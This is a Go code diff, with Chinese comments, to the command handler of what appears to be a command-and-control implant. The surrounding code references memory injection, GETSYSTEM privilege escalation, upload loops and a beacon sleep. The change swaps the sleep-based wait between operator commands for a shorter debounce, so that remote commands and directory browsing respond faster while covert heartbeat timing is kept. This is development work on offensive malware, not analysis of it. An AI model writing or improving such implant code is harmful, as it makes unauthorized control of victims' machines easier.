@@ -94,13 +94,20 @@ func HandleCommand(data []byte) {
 		cmdType != services.UploadLoop &&
 		cmdType != services.INJECT_MEM &&
 		cmdType != services.GETSYSTEM {
+		// 防抖而不是"跟着信标节奏走"：原来用 config.WaitTime（sleep）当命令间隔，
+		// 于是 sleep 5 的载荷里每点一次"执行命令/翻目录"都要等 5 秒。
+		// 隐蔽节奏由心跳/轮询自己维持，这里只需要挡住连点风暴。
+		debounce := config.CommandDebounce
+		if config.WaitTime > 0 && config.WaitTime < debounce {
+			debounce = config.WaitTime
+		}
 		commandTimeMutex.Lock()
-		if !lastCommandTime.IsZero() && config.WaitTime > 0 {
+		if !lastCommandTime.IsZero() && debounce > 0 {
 			elapsedTime := time.Since(lastCommandTime)
-			if elapsedTime < config.WaitTime {
-				remainingWait := config.WaitTime - elapsedTime
+			if elapsedTime < debounce {
+				remainingWait := debounce - elapsedTime
 				commandTimeMutex.Unlock()
-				debuglog.Printf("⏳ [休眠控制] 命令执行太频繁，等待 %v。。。\n", remainingWait)
+				debuglog.Printf("⏳ [防抖] 距上一条命令不足 %v，等待 %v。。。\n", debounce, remainingWait)
 				time.Sleep(remainingWait)
 				commandTimeMutex.Lock()
 			}
